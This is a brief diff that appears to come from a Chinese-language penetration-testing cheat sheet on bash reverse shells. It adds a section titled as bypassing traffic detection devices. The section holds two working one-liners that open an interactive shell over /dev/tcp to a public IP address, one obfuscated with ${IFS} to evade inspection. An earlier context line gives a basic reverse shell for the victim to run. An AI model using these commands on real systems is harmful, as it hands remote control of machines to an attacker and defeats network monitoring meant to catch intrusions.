@@ -104,3 +104,10 @@ victim执行：
 ```
 bash -i >& /dev/tcp/1.1.1.1/2333 0>&1
 ```
+# linux下bash反弹shell绕过流量检测设备
+```
+bash -c 'exec bash -i &>/dev/tcp/120.48.45.46/12345 <&1'
+
+bash -c bash${IFS}-i${IFS}>&/dev/tcp/120.48.45.46/12345<&1
+```
+参考链接：https://blog.csdn.net/whatday/article/details/107098353
